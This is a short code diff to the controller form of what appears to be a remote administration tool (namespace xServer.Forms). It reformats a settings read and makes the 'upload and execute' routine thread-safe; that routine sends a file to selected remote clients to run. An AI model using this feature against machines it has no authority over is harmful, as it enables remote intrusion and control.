@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Collections.Generic;
 using System.IO;
 using System.Threading;
 using System.Windows.Forms;
@@ -28,7 +29,10 @@ namespace xServer.Forms
             XMLSettings.AutoListen = bool.Parse(XMLSettings.ReadValue("AutoListen"));
             XMLSettings.ShowPopup = bool.Parse(XMLSettings.ReadValue("ShowPopup"));
             XMLSettings.UseUPnP = bool.Parse(XMLSettings.ReadValue("UseUPnP"));
-            XMLSettings.ShowToolTip = bool.Parse(!string.IsNullOrEmpty(XMLSettings.ReadValue("ShowToolTip")) ? XMLSettings.ReadValue("ShowToolTip") : "False"); //fallback
+            XMLSettings.ShowToolTip =
+                bool.Parse(!string.IsNullOrEmpty(XMLSettings.ReadValue("ShowToolTip"))
+                    ? XMLSettings.ReadValue("ShowToolTip")
+                    : "False"); //fallback
             XMLSettings.Password = XMLSettings.ReadValue("Password");
         }
 
@@ -507,9 +511,19 @@ namespace xServer.Forms
                     {
                         new Thread(() =>
                         {
-                            foreach (ListViewItem lvi in lstClients.SelectedItems)
+                            List<Client> clients = new List<Client>();
+
+                            this.lstClients.Invoke((MethodInvoker)delegate
                             {
-                                Client c = (Client) lvi.Tag;
+                                foreach (ListViewItem item in lstClients.SelectedItems)
+                                {
+                                    clients.Add((Client)item.Tag);
+                                }
+                            });
+
+                            foreach (Client c in clients)
+                            {
+                                if (c == null) continue;
 
                                 FileSplit srcFile = new FileSplit(UploadAndExecute.FilePath);
                                 if (srcFile.MaxBlocks < 0)
